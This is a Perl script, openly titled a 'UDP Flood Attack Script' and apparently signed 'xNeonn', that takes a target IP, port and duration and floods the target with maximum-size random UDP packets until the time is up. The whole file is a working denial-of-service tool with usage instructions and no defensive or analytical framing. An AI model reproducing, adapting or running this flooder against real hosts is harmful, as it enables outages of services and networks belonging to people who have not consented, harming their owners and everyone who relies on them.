#!/usr/bin/perl
# UDP Flood Attack Script
# Usage: perl UDP.pl <ip> <port> <time>
# Example: perl UDP.pl 192.168.1.1 80 60

use strict;
use warnings;
use Socket;

# Define the default UDP packet size
my $PACKET_SIZE = 65500;

# Check the number of arguments
my $num_args = $#ARGV + 1;
if ($num_args != 3) {
  print "\nUsage: perl UDP.pl <ip> <port> <time>\n";
  exit;
}

# Get the arguments
my ($ip, $port, $time) = @ARGV;

# Validate the arguments
if ($ip !~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) {
  print "\nInvalid IP address: $ip\n";
  exit;
}
if ($port !~ /^\d+$/ or $port < 1 or $port > 65535) {
  print "\nInvalid port number: $port\n";
  exit;
}
if ($time !~ /^\d+$/ or $time < 1) {
  print "\nInvalid time value: $time\n";
  exit;
}

# Create a UDP socket
socket(my $sock, PF_INET, SOCK_DGRAM, 17) or die "Can't create socket: $!\n";

# Set the destination address
my $dest_addr = sockaddr_in($port, inet_aton($ip));

# Calculate the end time
my $end_time = time() + $time;

# Start the attack loop
while (1) {
  # Generate a random payload
  my $payload = "xNeonn";
  $payload .= chr(rand(256)) for (1..$PACKET_SIZE);

  # Send the payload to the destination
  send($sock, $payload, 0, $dest_addr) or die "Can't send data: $!\n";

  # Print a message
  print "[xNeonn] Attack Sent > $ip:$port > $time seconds \n";

  # Check the end time
  last if time() >= $end_time;
}

# Close the socket
close($sock);